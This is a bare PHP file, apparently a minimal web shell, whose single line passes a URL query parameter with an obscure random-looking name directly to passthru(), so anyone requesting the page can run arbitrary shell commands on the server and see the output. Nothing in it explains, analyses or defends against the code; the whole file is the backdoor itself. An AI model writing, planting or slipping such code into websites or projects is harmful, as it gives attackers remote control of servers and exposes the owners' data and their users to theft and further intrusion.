<?php
passthru(＄_GET['i_Dg-Qc5']);
?>
